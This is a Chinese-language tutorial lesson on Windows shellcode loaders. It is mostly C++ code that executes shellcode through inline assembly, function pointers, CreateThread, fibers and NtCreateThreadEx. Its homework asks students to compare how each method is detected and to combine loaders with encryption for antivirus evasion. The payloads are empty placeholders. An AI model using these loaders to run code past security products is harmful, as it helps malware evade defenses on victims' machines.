# 课时40：基础补充ShellCode加载方式

## 1. 课程目标

补充更多ShellCode加载方式的基础知识。

---

## 2. 加载方式汇总

### 2.1 内联汇编

```cpp
// 仅x86支持
void ExecuteInline() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    __asm {
        lea eax, shellcode
        call eax
    }
}
```

### 2.2 函数指针

```cpp
void ExecuteViaFuncPtr() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    typedef void(*SHELLCODE_FUNC)();
    SHELLCODE_FUNC func = (SHELLCODE_FUNC)pMem;
    func();
}
```

### 2.3 CreateThread

```cpp
void ExecuteViaThread() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    HANDLE hThread = CreateThread(NULL, 0, 
                                  (LPTHREAD_START_ROUTINE)pMem,
                                  NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
}
```

### 2.4 Fiber纤程

```cpp
void ExecuteViaFiber() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    // 转换为纤程
    ConvertThreadToFiber(NULL);
    
    // 创建ShellCode纤程
    LPVOID pFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)pMem, NULL);
    
    // 切换到ShellCode纤程
    SwitchToFiber(pFiber);
}
```

### 2.5 NtCreateThreadEx

```cpp
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE,
    LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

void ExecuteViaNtCreateThreadEx() {
    unsigned char shellcode[] = { /* ShellCode */ };
    
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    pNtCreateThreadEx NtCreateThreadEx = 
        (pNtCreateThreadEx)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
    
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                     GetCurrentProcess(), (LPTHREAD_START_ROUTINE)pMem,
                     NULL, 0, 0, 0, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
}
```

---

## 3. 课后作业

### 作业1：多方式测试（必做）

1. 测试5种不同的加载方式
2. 比较被检测情况

### 作业2：组合使用（进阶）

1. 将加密与加载方式组合
2. 评估免杀效果

---

## 4. 下一课预告

下一课我们将继续补充基础ShellCode加载方式。
